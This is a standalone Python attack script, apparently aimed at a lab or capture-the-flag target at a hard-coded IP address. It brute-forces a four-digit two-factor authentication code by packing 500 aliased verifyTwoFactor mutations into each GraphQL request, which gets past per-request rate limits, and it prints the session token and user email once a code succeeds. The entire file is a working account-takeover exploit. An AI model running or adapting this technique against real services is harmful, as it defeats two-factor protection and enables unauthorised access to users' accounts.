#!/usr/bin/env python3
import json
import urllib.request

URL = "http://154.57.164.82:31232/graphql"
TWO_FACTOR_TOKEN = "309cd3dd-452a-45af-a4e6-ead3fd1b1458"


def graphql(query, variables=None, authorization=None):
    body = json.dumps({"query": query, "variables": variables or {}}).encode()
    headers = {"Content-Type": "application/json"}
    if authorization:
        headers["Authorization"] = authorization
    request = urllib.request.Request(URL, data=body, headers=headers)
    with urllib.request.urlopen(request, timeout=30) as response:
        return json.load(response)


for start in range(0, 10000, 500):
    fields = []
    for otp in range(start, start + 500):
        code = f"{otp:04d}"
        fields.append(
            f'a{otp}:verifyTwoFactor(token:"{TWO_FACTOR_TOKEN}",otp:"{code}")'
            "{token user{id email}}"
        )
    result = graphql("mutation{" + " ".join(fields) + "}")
    for name, value in (result.get("data") or {}).items():
        if value and value.get("token"):
            print(json.dumps({"otp": name[1:].zfill(4), **value}, indent=2))
            raise SystemExit(0)
    print(f"tried {start:04d}-{start + 499:04d}")

raise SystemExit("No four-digit OTP succeeded")
